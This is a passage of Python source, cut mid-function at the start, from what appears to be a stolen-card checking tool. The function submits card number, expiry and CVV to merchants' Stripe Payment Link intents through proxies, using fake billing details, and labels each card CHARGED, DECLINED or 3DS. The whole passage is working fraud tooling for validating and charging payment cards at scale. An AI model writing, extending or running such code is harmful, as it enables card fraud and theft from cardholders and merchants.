                result["message"] = "3DS required"
            elif resp.get("payment_intent"):
                pi_status = resp["payment_intent"].get("status", "")
                if pi_status == "succeeded":
                    result["status"] = "CHARGED"
                    result["message"] = "Payment successful"
                elif pi_status == "requires_action":
                    result["status"] = "3DS"
                    result["message"] = "3DS required"
                else:
                    result["message"] = f"PI status: {pi_status}"
            else:
                result["message"] = f"Status: {status}"
                
    except Exception as e:
        result["message"] = str(e)[:100]
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_payment_link_card(card: dict, pk: str, pi: str, client_secret: str, proxy_str: str = None) -> dict:
    """Charge a card on a Payment Link using payment intent confirmation"""
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": "DECLINED",
        "message": None,
        "response": None,
        "time": 0
    }
    
    if not pk:
        result["message"] = "No PK provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    if not pi or not client_secret:
        result["message"] = "No payment intent or secret provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    proxy_url = get_proxy_url(proxy_str) if proxy_str else None
    session = await get_charge_session(proxy_url)
    
    try:
        confirm_body = (
            f"payment_method_data[type]=card"
            f"&payment_method_data[card][number]={card['cc']}"
            f"&payment_method_data[card][exp_month]={card['month']}"
            f"&payment_method_data[card][exp_year]={card['year']}"
            f"&payment_method_data[card][cvc]={card['cvv']}"
            f"&payment_method_data[billing_details][name]=John Smith"
            f"&payment_method_data[billing_details][email]=test@example.com"
            f"&payment_method_data[billing_details][address][country]=US"
            f"&payment_method_data[billing_details][address][postal_code]=85935"
            f"&expected_payment_method_type=card"
            f"&client_secret={client_secret}"
            f"&key={pk}"
        )
        
        async with session.post(
            f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
            headers=HEADERS,
            data=confirm_body,
            proxy=proxy_url
        ) as r:
            resp = await r.json()
        
        if "error" in resp:
            error_msg = resp["error"].get("message", "Card error")
            decline_code = resp["error"].get("decline_code", "")
            code = resp["error"].get("code", "")
            
            if decline_code or "decline" in error_msg.lower() or "insufficient" in error_msg.lower():
                result["status"] = "DECLINED"
                result["message"] = f"{decline_code.upper() if decline_code else code}: {error_msg}"[:100]
            elif "3d_secure" in error_msg.lower() or "authentication" in error_msg.lower():
                result["status"] = "3DS"
                result["message"] = error_msg[:100]
            else:
                result["status"] = "DECLINED"
                result["message"] = error_msg[:100]
        else:
            status = resp.get("status", "")
            if status == "succeeded":
                result["status"] = "CHARGED"
                result["message"] = "Payment successful"
            elif status == "processing":
                result["status"] = "PROCESSING"
                result["message"] = "Processing"
            elif status == "requires_action":
                next_action = resp.get("next_action", {})
                action_type = next_action.get("type", "")
                if action_type == "redirect_to_url":
                    result["status"] = "3DS"
                    result["message"] = "3DS redirect required"
                elif action_type == "use_stripe_sdk":
                    result["status"] = "3DS"
                    result["message"] = "3DS SDK required"
                else:
                    result["status"] = "3DS"
                    result["message"] = f"3DS: {action_type}" if action_type else "3DS required"
            elif status == "requires_payment_method":
                result["status"] = "DECLINED"
                result["message"] = "Card declined"
            else:
                result["status"] = "UNKNOWN"
                result["message"] = f"Status: {status}"
        
        result["time"] = round(time.perf_counter() - start, 2)
        return result
        
    except asyncio.TimeoutError:
        result["status"] = "TIMEOUT"
        result["message"] = "Request timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:50]
        result["time"] = round(time.perf_counter() - start, 2)
        return result
